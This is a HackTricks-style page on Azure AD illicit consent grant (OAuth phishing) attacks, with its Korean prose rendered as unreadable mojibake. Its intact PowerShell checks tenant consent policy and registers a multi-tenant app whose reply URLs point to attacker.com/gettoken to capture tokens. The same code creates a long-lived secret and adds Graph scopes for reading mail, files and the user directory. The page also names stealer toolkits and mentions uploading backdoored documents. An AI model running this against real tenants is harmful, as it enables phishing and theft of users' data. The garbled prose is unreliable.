# Az - ë¶ˆë²• ë™ì˜ ë¶€ì—¬

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ **ì œë¡œ**ë¶€í„° **íˆì–´ë¡œ**ê¹Œì§€ **AWS í•´í‚¹**ì„ ë°°ìš°ì„¸ìš”!</summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ê°€ HackTricksì— ê´‘ê³ **ë˜ê¸¸ ì›í•˜ê±°ë‚˜ **PDF í˜•ì‹ì˜ HackTricks ë‹¤ìš´ë¡œë“œ**ë¥¼ ì›í•œë‹¤ë©´ [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™œê·¸**](https://peass.creator-spring.com)ë¥¼ êµ¬ë§¤í•˜ì„¸ìš”
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ë‹¹ì‚¬ì˜ ë…ì  [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
* ğŸ’¬ [**ë””ìŠ¤ì½”ë“œ ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ê°€ì…**í•˜ê±°ë‚˜ **íŠ¸ìœ„í„°** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)ë¥¼ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **í•´í‚¹ ìš”ë ¹ì„ ê³µìœ **í•˜ë ¤ë©´ **HackTricks** ë° **HackTricks Cloud** github ì €ì¥ì†Œë¡œ PRì„ ì œì¶œí•˜ì„¸ìš”.

</details>

## OAuth ì•± ì‚¬ê¸°

**Azure ì• í”Œë¦¬ì¼€ì´ì…˜**ì€ **ì‚¬ìš©ì ë°ì´í„°**(ê¸°ë³¸ ì •ë³´ë¿ë§Œ ì•„ë‹ˆë¼ ë¬¸ì„œ ì•¡ì„¸ìŠ¤, ì´ë©”ì¼ ì „ì†¡ ë“±)ì— ì•¡ì„¸ìŠ¤í•  ê¶Œí•œì„ ìš”ì²­í•©ë‹ˆë‹¤.\
**í—ˆìš©**ëœ ê²½ìš°, ì¼ë°˜ ì‚¬ìš©ìëŠ” **"ë‚®ì€ ì˜í–¥ ê¶Œí•œ"**ì— ëŒ€í•´ì„œë§Œ ë™ì˜ë¥¼ ë¶€ì—¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. **ë‹¤ë¥¸ ëª¨ë“ ** ê²½ìš°ì—ëŠ” **ê´€ë¦¬ì ë™ì˜ê°€ í•„ìš”**í•©ë‹ˆë‹¤.\
`GA`, `ApplicationAdministrator`, `CloudApplication` `Administrator` ë° `ì• í”Œë¦¬ì¼€ì´ì…˜ì— ê¶Œí•œì„ ë¶€ì—¬í•  ìˆ˜ ìˆëŠ” ê¶Œí•œ`ì„ í¬í•¨í•˜ëŠ” ì‚¬ìš©ì ì •ì˜ ì—­í• ì€ í…Œë„ŒíŠ¸ ì „ì²´ ë™ì˜ë¥¼ ì œê³µí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

**ê´€ë¦¬ì ë™ì˜ê°€ í•„ìš”í•˜ì§€ ì•ŠëŠ” ê¶Œí•œ**ë§Œì´ **ë‚®ì€ ì˜í–¥**ìœ¼ë¡œ ë¶„ë¥˜ë©ë‹ˆë‹¤. ì´ëŠ” **ê¸°ë³¸ ë¡œê·¸ì¸ì— í•„ìš”í•œ ê¶Œí•œ**ìœ¼ë¡œ openid, profile, email, User.Read ë° offline\_access ê¶Œí•œì„ í¬í•¨í•©ë‹ˆë‹¤. **ì¡°ì§**ì´ **ëª¨ë“  ì•±ì— ëŒ€í•´ ì‚¬ìš©ì ë™ì˜ë¥¼ í—ˆìš©**í•˜ëŠ” ê²½ìš°, ì§ì›ì€ ì•±ì— ëŒ€í•´ **í”„ë¡œí•„ì—ì„œ ìœ„ì˜ ë‚´ìš©ì„ ì½ì„ ìˆ˜ ìˆëŠ” ë™ì˜**ë¥¼ ë¶€ì—¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

<figure><img src="../../../.gitbook/assets/image (3) (2) (1).png" alt=""><figcaption></figcaption></figure>

ë”°ë¼ì„œ ê³µê²©ìëŠ” **ì•…ì„± ì•±**ì„ ì¤€ë¹„í•˜ê³  **í”¼ì‹±**ì„ í†µí•´ ì‚¬ìš©ìê°€ **ì•±ì„ ìˆ˜ë½í•˜ê³  ë°ì´í„°ë¥¼ ë„ë‚œë‹¹í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**.

### 2ê°€ì§€ ìœ í˜•ì˜ ë¶ˆë²• ë™ì˜ ë¶€ì—¬ ê³µê²©

* **ì¸ì¦ë˜ì§€ ì•ŠìŒ**: ì™¸ë¶€ ê³„ì •ì—ì„œ `User.Read` ë° `User.ReadBasic.All` ê¶Œí•œì„ ê°€ì§„ ì• í”Œë¦¬ì¼€ì´ì…˜ì„ ìƒì„±í•˜ê³  ì‚¬ìš©ìë¥¼ í”¼ì‹±í•˜ì—¬ ë””ë ‰í„°ë¦¬ ì •ë³´ì— ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* ì´ëŠ” í”¼ì‹±ë‹¹í•œ ì‚¬ìš©ìê°€ ì™¸ë¶€ í™˜ê²½ì—ì„œ OAuth ì•±ì„ ìˆ˜ë½í•  ìˆ˜ ìˆì–´ì•¼ í•©ë‹ˆë‹¤!
* **ì¸ì¦ë¨**: ì¶©ë¶„í•œ ê¶Œí•œì„ ê°€ì§„ ì£¼ì²´ë¥¼ ì¹¨í•´í•œ í›„ ê³„ì • ë‚´ì—ì„œ ì• í”Œë¦¬ì¼€ì´ì…˜ì„ ìƒì„±í•˜ê³  íŠ¹ê¶Œì´ ìˆëŠ” OAuth ê¶Œí•œì„ ìˆ˜ë½í•  ìˆ˜ ìˆëŠ” íŠ¹ê¶Œì´ ìˆëŠ” ì‚¬ìš©ìë¥¼ í”¼ì‹±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* ì´ ê²½ìš° ì´ë¯¸ ë””ë ‰í„°ë¦¬ ì •ë³´ì— ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆìœ¼ë¯€ë¡œ ê¶Œí•œ `User.ReadBasic.All`ì€ ë” ì´ìƒ í¥ë¯¸ë¡œìš´ ê²ƒì´ ì•„ë‹™ë‹ˆë‹¤.
* **ê´€ë¦¬ìê°€ ë¶€ì—¬í•´ì•¼ í•˜ëŠ” ê¶Œí•œ**ì— ê´€ì‹¬ì´ ìˆì„ ê²ƒì´ë©°, ì›ì‹œ ì‚¬ìš©ìëŠ” OAuth ì•±ì— ì–´ë–¤ ê¶Œí•œë„ ë¶€ì—¬í•  ìˆ˜ ì—†ê¸° ë•Œë¬¸ì— **í•´ë‹¹ ì‚¬ìš©ìë§Œ í”¼ì‹±í•´ì•¼**í•©ë‹ˆë‹¤(ë‚˜ì¤‘ì— ì´ ê¶Œí•œì„ ë¶€ì—¬í•˜ëŠ” ì—­í• /ê¶Œí•œì— ëŒ€í•´ ìì„¸íˆ ì„¤ëª…í•¨)

### ì‚¬ìš©ìê°€ ë™ì˜í•  ìˆ˜ ìˆëŠ”ì§€ í™•ì¸

ë‹¤ìŒ PowerShell ëª…ë ¹ì€ Azure Active Directory(Azure AD)ì—ì„œ ì‚¬ìš©ìê°€ ì• í”Œë¦¬ì¼€ì´ì…˜ì— ë™ì˜í•  ìˆ˜ ìˆëŠ”ì§€ì— ëŒ€í•œ ë™ì˜ êµ¬ì„±ì„ í™•ì¸í•˜ëŠ” ë° ì‚¬ìš©ë©ë‹ˆë‹¤:
```powershell
PS AzureADPreview> (GetAzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole
```
* **ì‚¬ìš©ì ë™ì˜ ë¹„í™œì„±í™”**: ì´ ì„¤ì •ì€ ì‚¬ìš©ìê°€ ì‘ìš© í”„ë¡œê·¸ë¨ì— ê¶Œí•œì„ ë¶€ì—¬í•˜ëŠ” ê²ƒì„ ê¸ˆì§€í•©ë‹ˆë‹¤. ì‚¬ìš©ì ë™ì˜ë¥¼ í†µí•´ ì‘ìš© í”„ë¡œê·¸ë¨ì— ê¶Œí•œì„ ë¶€ì—¬í•  ìˆ˜ ì—†ìŠµë‹ˆë‹¤.
* **ì‚¬ìš©ìëŠ” í™•ì¸ëœ ê²Œì‹œì ë˜ëŠ” ê·€í•˜ì˜ ì¡°ì§ì—ì„œ ì•±ì— ë™ì˜í•  ìˆ˜ ìˆì§€ë§Œ ì„ íƒí•œ ê¶Œí•œì— ëŒ€í•´ì„œë§Œ**: ì´ ì„¤ì •ì€ ëª¨ë“  ì‚¬ìš©ìê°€ í™•ì¸ëœ ê²Œì‹œìì— ì˜í•´ ê²Œì‹œëœ ì‘ìš© í”„ë¡œê·¸ë¨ ë° ê·€í•˜ì˜ í…Œë„ŒíŠ¸ì— ë“±ë¡ëœ ì‘ìš© í”„ë¡œê·¸ë¨ì—ë§Œ ë™ì˜í•  ìˆ˜ ìˆë„ë¡ í—ˆìš©í•©ë‹ˆë‹¤. íŠ¹ì • ê¶Œí•œì— ëŒ€í•´ì„œë§Œ ë™ì˜í•  ìˆ˜ ìˆë„ë¡ í—ˆìš©í•¨ìœ¼ë¡œì¨ ì œì–´ ìˆ˜ì¤€ì„ ì¶”ê°€í•©ë‹ˆë‹¤.
* **ì‚¬ìš©ìëŠ” ëª¨ë“  ì•±ì— ë™ì˜í•  ìˆ˜ ìˆìŒ**: ì´ ì„¤ì •ì€ ë” í—ˆìš©ì ì´ë©°, í•´ë‹¹ ê¶Œí•œì´ ê´€ë¦¬ ë™ì˜ë¥¼ í•„ìš”ë¡œí•˜ì§€ ì•ŠëŠ” í•œ ëª¨ë“  ì‚¬ìš©ìê°€ ì‘ìš© í”„ë¡œê·¸ë¨ì— ëŒ€í•œ ì–´ë–¤ ê¶Œí•œì— ëŒ€í•´ì„œë„ ë™ì˜í•  ìˆ˜ ìˆë„ë¡ í—ˆìš©í•©ë‹ˆë‹¤.
* **ì‚¬ìš©ì ì •ì˜ ì•± ë™ì˜ ì •ì±…**: ì´ ì„¤ì •ì€ íŠ¹ì • ì¡°ì§ ìš”êµ¬ ì‚¬í•­ì— ë§ê²Œ ë§ì¶¤ ì •ì±…ì´ ì ìš©ë˜ì–´ ìˆìŒì„ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤. ì´ëŠ” ì‘ìš© í”„ë¡œê·¸ë¨ ê²Œì‹œì, ì‘ìš© í”„ë¡œê·¸ë¨ì´ ìš”ì²­í•˜ëŠ” ê¶Œí•œ ë° ê¸°íƒ€ ìš”ì†Œì— ê¸°ë°˜í•œ ì œí•œì˜ ì¡°í•©ì„ í¬í•¨í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

## **ë¶ˆë²• ë™ì˜ ë¶€ì—¬ ê³µê²© ì´í•´**

ë¶ˆë²• ë™ì˜ ë¶€ì—¬ ê³µê²©ì—ì„œ ê³µê²©ìëŠ” ë ì‚¬ìš©ìë¥¼ ì†ì—¬ Azureì— ë“±ë¡ëœ ì•…ì„± ì‘ìš© í”„ë¡œê·¸ë¨ì— ê¶Œí•œì„ ë¶€ì—¬í•˜ë„ë¡ ìœ ë„í•©ë‹ˆë‹¤. ì´ëŠ” ì‘ìš© í”„ë¡œê·¸ë¨ì´ ì •ë‹¹í•˜ë‹¤ê³  ë³´ì´ë„ë¡ ë§Œë“¤ì–´ì ¸ í”¼í•´ìê°€ ëª¨ë¥´ê²Œ "ìˆ˜ë½" ë²„íŠ¼ì„ í´ë¦­í•˜ê²Œ í•©ë‹ˆë‹¤. ê²°ê³¼ì ìœ¼ë¡œ Azure ADëŠ” ê³µê²©ìì˜ ì‚¬ì´íŠ¸ë¡œ í† í°ì„ ë°œê¸‰í•˜ì—¬ ì¡°ì§ ê³„ì •ì´ í•„ìš”í•˜ì§€ ì•Šê³ ë„ í”¼í•´ìì˜ ë°ì´í„°ì— ì•¡ì„¸ìŠ¤í•˜ê³  ì¡°ì‘í•  ìˆ˜ ìˆê²Œ í•©ë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´ ì´ë©”ì¼ ì½ê¸° ë˜ëŠ” ë³´ë‚´ê¸°, íŒŒì¼ ì•¡ì„¸ìŠ¤ ë“±ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.

## **ê³µê²© íë¦„ ê°œìš”**

ì´ ê³µê²©ì€ ì¼ë°˜ì ì¸ íšŒì‚¬ë¥¼ ëŒ€ìƒìœ¼ë¡œ ì—¬ëŸ¬ ë‹¨ê³„ë¥¼ ê±°ì³ ì§„í–‰ë©ë‹ˆë‹¤. ë‹¤ìŒì€ ê³µê²©ì´ ì „ê°œë  ìˆ˜ ìˆëŠ” ë°©ì‹ì…ë‹ˆë‹¤:

1. **ë„ë©”ì¸ ë“±ë¡ ë° ì‘ìš© í”„ë¡œê·¸ë¨ í˜¸ìŠ¤íŒ…**: ê³µê²©ìëŠ” ì‹ ë¢°í•  ìˆ˜ ìˆëŠ” ì‚¬ì´íŠ¸ì™€ ìœ ì‚¬í•œ ë„ë©”ì¸ì„ ë“±ë¡í•©ë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´ "safedomainlogin.com"ê³¼ ê°™ì´ ë“±ë¡í•©ë‹ˆë‹¤. ì´ ë„ë©”ì¸ í•˜ìœ„ ë„ë©”ì¸(e.g., "companyname.safedomainlogin.com")ì—ëŠ” ê¶Œí•œ ë¶€ì—¬ ì½”ë“œë¥¼ ìº¡ì²˜í•˜ê³  ì•¡ì„¸ìŠ¤ í† í°ì„ ìš”ì²­í•˜ëŠ” ì• í”Œë¦¬ì¼€ì´ì…˜ì„ í˜¸ìŠ¤íŒ…í•©ë‹ˆë‹¤.
2. **Azure ADì— ì‘ìš© í”„ë¡œê·¸ë¨ ë“±ë¡**: ê·¸ëŸ° ë‹¤ìŒ ê³µê²©ìëŠ” ìì‹ ì˜ Azure AD í…Œë„ŒíŠ¸ì— ë‹¤ì¤‘ í…Œë„ŒíŠ¸ ì‘ìš© í”„ë¡œê·¸ë¨ì„ ë“±ë¡í•˜ê³  ëŒ€ìƒ íšŒì‚¬ ì´ë¦„ì„ ì‚¬ìš©í•˜ì—¬ ì •ë‹¹í•˜ë‹¤ê³  ë³´ì´ë„ë¡ í•©ë‹ˆë‹¤. ì•…ì„± ì‘ìš© í”„ë¡œê·¸ë¨ì„ í˜¸ìŠ¤íŒ…í•˜ëŠ” í•˜ìœ„ ë„ë©”ì¸ì„ ê°€ë¦¬í‚¤ë„ë¡ ì‘ìš© í”„ë¡œê·¸ë¨ì˜ ë¦¬ë””ë ‰ì…˜ URLì„ êµ¬ì„±í•©ë‹ˆë‹¤.
3. **ê¶Œí•œ ì„¤ì •**: ê³µê²©ìëŠ” ë‹¤ì–‘í•œ API ê¶Œí•œ(e.g., `Mail.Read`, `Notes.Read.All`, `Files.ReadWrite.All`, `User.ReadBasic.All`, `User.Read`)ìœ¼ë¡œ ì‘ìš© í”„ë¡œê·¸ë¨ì„ ì„¤ì •í•©ë‹ˆë‹¤. ì‚¬ìš©ìê°€ ì´ëŸ¬í•œ ê¶Œí•œì„ ë¶€ì—¬í•˜ë©´ ê³µê²©ìëŠ” ì‚¬ìš©ìë¥¼ ëŒ€ì‹ í•˜ì—¬ ë¯¼ê°í•œ ì •ë³´ë¥¼ ì¶”ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
4. **ì•…ì„± ë§í¬ ë°°í¬**: ê³µê²©ìëŠ” ì•…ì„± ì‘ìš© í”„ë¡œê·¸ë¨ì˜ í´ë¼ì´ì–¸íŠ¸ IDë¥¼ í¬í•¨í•œ ë§í¬ë¥¼ ì‘ì„±í•˜ê³  ëŒ€ìƒ ì‚¬ìš©ìì—ê²Œ ê³µìœ í•˜ì—¬ ë™ì˜í•˜ë„ë¡ ì†ì…ë‹ˆë‹¤.

## **ê³µê²©ì— ëŒ€í•œ ë„êµ¬ í™œìš©**

ì´ ê³µê²©ì€ [**365-Stealer**](https://github.com/AlteredSecurity/365-Stealer)ì™€ ê°™ì€ ë„êµ¬ë¥¼ ì‚¬ìš©í•˜ì—¬ ìˆ˜í–‰ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### ê³µê²© ì „ ì¤€ë¹„:

ê³µê²©ìê°€ í”¼í•´ ì¡°ì§ì˜ ì‚¬ìš©ìì—ê²Œ ì–´ë–¤ ìˆ˜ì¤€ì˜ ì•¡ì„¸ìŠ¤ ê¶Œí•œì´ ìˆëŠ”ì§€ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```powershell
Import-Module .\AzureADPreview\AzureADPreview.psd1
$passwd = ConvertTo-SecureString "Password!" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("generic@corp.onmicrosoft.com", $passwd)
Connect-AzureAD -Credential $creds
(Get-AzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole
# Check if "ManagePermissionGrantsForSelf.microsoft-user-default-legacy" is present, indicating permission to accept apps.
```
ê³µê²©ì„ ì‹¤í–‰í•˜ê¸° ìœ„í•´ ê³µê²©ìëŠ” **Azure í…Œë„ŒíŠ¸** (ì•± ë“±ë¡)ì—ì„œ **ìƒˆ ì•±ì„ ìƒì„±**í•´ì•¼ í•˜ë©° ë‹¤ìŒ ê¶Œí•œìœ¼ë¡œ êµ¬ì„±í•´ì•¼ í•©ë‹ˆë‹¤:

<figure><img src="../../../.gitbook/assets/image (2) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

`User.ReadBasic.All`ì€ `Microsoft Graph`ì˜ `ìœ„ì„ëœ ê¶Œí•œ`ì— ìˆìŠµë‹ˆë‹¤. (ì‘ìš© í”„ë¡œê·¸ë¨ ê¶Œí•œì€ í•­ìƒ ì¶”ê°€ ìŠ¹ì¸ì´ í•„ìš”í•©ë‹ˆë‹¤).

* `User.ReadBasic.All`ì€ ë¶€ì—¬ëœ ê²½ìš° ì¡°ì§ì˜ **ëª¨ë“  ì‚¬ìš©ì ì •ë³´ë¥¼ ì½ì„ ìˆ˜ ìˆëŠ” ê¶Œí•œ**ì…ë‹ˆë‹¤.
* `GA`, `ApplicationAdministrator`, `CloudApplication Administrator` ë° `ì‘ìš© í”„ë¡œê·¸ë¨ì— ê¶Œí•œ ë¶€ì—¬ ê¶Œí•œì„ ë¶€ì—¬í•˜ëŠ”` ì‚¬ìš©ìë§Œ í…Œë„ŒíŠ¸ ì „ì²´ ë™ì˜ë¥¼ ì œê³µí•  ìˆ˜ ìˆìŒì„ ê¸°ì–µí•˜ì„¸ìš”. ë”°ë¼ì„œ **ê´€ë¦¬ì ë™ì˜ê°€ í•„ìš”í•œ ì•±ì„ ìŠ¹ì¸í•˜ë„ë¡ ì›í•œë‹¤ë©´ í•´ë‹¹ ì—­í•  ì¤‘ í•˜ë‚˜ë¥¼ ê°€ì§„ ì‚¬ìš©ìë¥¼ **ì‚¬ê¸°**í•´ì•¼ í•©ë‹ˆë‹¤.

ë˜í•œ ë‹¤ìŒ CLIë¥¼ í†µí•´ ì•±ì„ ë§Œë“¤ ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤:

{% code overflow="wrap" %}
```bash
# Generate Application
New-AzureADApplication -DisplayName "MyApp"  -ReplyUrls @("https://attacker.com", "https://attacker.com/gettoken") -Oauth2AllowImplicitFlow $true -AvailableToOtherTenants $true

# Generate Secret
New-AzureADApplicationPasswordCredential -ObjectId f76ebd35-xxxx-xxxx-xxxx-xxxxxxxxxxxx -CustomKeyIdentifier "MyAppSecret" -StartDate (Get-Date) -EndDate (Get-Date).AddYears(3)

# Generate an application with the permissions
$objectid=New-AzureADApplication -DisplayName "AppName"  -ReplyUrls @("https://example.com/login/authorized") -Oauth2AllowImplicitFlow $true -AvailableToOtherTenants $true | select-object ObjectId
New-AzureADApplicationPasswordCredential -ObjectId $objectid.ObjectId -CustomKeyIdentifier "secret" -StartDate (Get-Date) -EndDate (Get-Date).AddYears(3)

$AppObjectID = $objectid.ObjectId # object id in AD
$app = Get-AzureADApplication -ObjectId $AppObjectID
$AADAccess = $app.RequiredResourceAccess | Where-Object {$_.ResourceAppId -eq "00000003-0000-0000-c000-000000000000"}  # "00000003-0000-0000-c000-000000000000" represents Graph API
if($AADAccess -eq $null) {
$AADAccess = New-Object Microsoft.Open.AzureAD.Model.RequiredResourceAccess
$AADAccess.ResourceAppId = "00000003-0000-0000-c000-000000000000"

$Access = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access.Type = "Scope"
$Access.Id = "14dad69e-099b-42c9-810b-d002981feec1"
$AADAccess.ResourceAccess = @()
$AADAccess.ResourceAccess.Add($Access)

$Access2 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access2.Type = "Scope"
$Access2.Id = "e1fe6dd8-ba31-4d61-89e7-88639da4683d"
$AADAccess.ResourceAccess.Add($Access2)

$Access3 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access3.Type = "Scope"
$Access3.Id = "df85f4d6-205c-4ac5-a5ea-6bf408dba283"
$AADAccess.ResourceAccess.Add($Access3)

$Access4 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access4.Type = "Scope"
$Access4.Id = "10465720-29dd-4523-a11a-6a75c743c9d9"
$AADAccess.ResourceAccess.Add($Access4)

$app.RequiredResourceAccess.Add($AADAccess)
} else {
$Access = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access.Type = "Scope"
$Access.Id = "14dad69e-099b-42c9-810b-d002981feec1"
$AADAccess.ResourceAccess = @()
$AADAccess.ResourceAccess.Add($Access)

$Access2 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access2.Type = "Scope"
$Access2.Id = "e1fe6dd8-ba31-4d61-89e7-88639da4683d"
$AADAccess.ResourceAccess.Add($Access2)

$Access3 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access3.Type = "Scope"
$Access3.Id = "df85f4d6-205c-4ac5-a5ea-6bf408dba283"
$AADAccess.ResourceAccess.Add($Access3)

$Access4 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access4.Type = "Scope"
$Access4.Id = "10465720-29dd-4523-a11a-6a75c743c9d9"
$AADAccess.ResourceAccess.Add($Access4)
}

Set-AzureADApplication -ObjectId $AppObjectID -RequiredResourceAccess $app.RequiredResourceAccess
Get-AzureADApplication -ObjectId $objectid.ObjectId | select-object appid
```
{% endcode %}

[https://www.alteredsecurity.com/post/introduction-to-365-stealer](https://www.alteredsecurity.com/post/introduction-to-365-stealer)ë¥¼ í™•ì¸í•˜ì—¬ êµ¬ì„±í•˜ëŠ” ë°©ë²•ì„ ë°°ìš°ì„¸ìš”.

{% hint style="warning" %}
ì–»ì€ **ì•¡ì„¸ìŠ¤ í† í°**ì€ **ê·¸ë˜í”„ ì—”ë“œí¬ì¸íŠ¸**ë¥¼ ìœ„í•œ ê²ƒì´ë©° `User.Read` ë° `User.ReadBasic.All` (ìš”ì²­ëœ ê¶Œí•œ) ìŠ¤ì½”í”„ë¥¼ ê°€ì§‘ë‹ˆë‹¤. ë‹¤ë¥¸ ì‘ì—…ì„ ìˆ˜í–‰í•  ìˆ˜ëŠ” ì—†ì§€ë§Œ (ê·¸ëŸ¬ë‚˜ ì´ëŠ” ì¡°ì§ì˜ ëª¨ë“  ì‚¬ìš©ìì— ëŒ€í•œ ì •ë³´ë¥¼ **ë‹¤ìš´ë¡œë“œí•˜ëŠ” ë° ì¶©ë¶„**í•©ë‹ˆë‹¤).
{% endhint %}

## [O365-Attack-Toolkit](https://github.com/mdsecactivebreach/o365-attack-toolkit)

ë˜í•œ ì´ ë„êµ¬ë¥¼ ì‚¬ìš©í•˜ì—¬ ì´ ê³µê²©ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

## ì‚¬í›„ ê³µê²©

ì‚¬ìš©ìì—ê²Œ ì•¡ì„¸ìŠ¤ ê¶Œí•œì´ ë¶€ì—¬ë˜ë©´ ë¯¼ê°í•œ ë¬¸ì„œë¥¼ í›”ì¹˜ê±°ë‚˜ ë°±ë„ì–´ê°€ ì„¤ì¹˜ëœ ë¬¸ì„œ íŒŒì¼ì„ ì—…ë¡œë“œí•˜ëŠ” ë“±ì˜ ì‘ì—…ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

## ì°¸ê³  ìë£Œ

* [https://www.alteredsecurity.com/post/introduction-to-365-stealer](https://www.alteredsecurity.com/post/introduction-to-365-stealer)
* [https://swisskyrepo.github.io/InternalAllTheThings/cloud/azure/azure-phishing/](https://swisskyrepo.github.io/InternalAllTheThings/cloud/azure/azure-phishing/)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ **ì œë¡œë¶€í„° ì˜ì›…ê¹Œì§€ AWS í•´í‚¹ì„ ë°°ìš°ì„¸ìš”**!</summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ PDFë¡œ ë‹¤ìš´ë¡œë“œí•˜ë ¤ë©´** [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™œê·¸**](https://peass.creator-spring.com)ë¥¼ êµ¬ë§¤í•˜ì„¸ìš”
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ë‹¹ì‚¬ì˜ ë…ì  [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
* ğŸ’¬ [**ë””ìŠ¤ì½”ë“œ ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ê°€ì…**í•˜ê±°ë‚˜ **íŠ¸ìœ„í„°** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)ë¥¼ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **HackTricks ë° HackTricks Cloud** github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ **í•˜ì„¸ìš”.

</details>
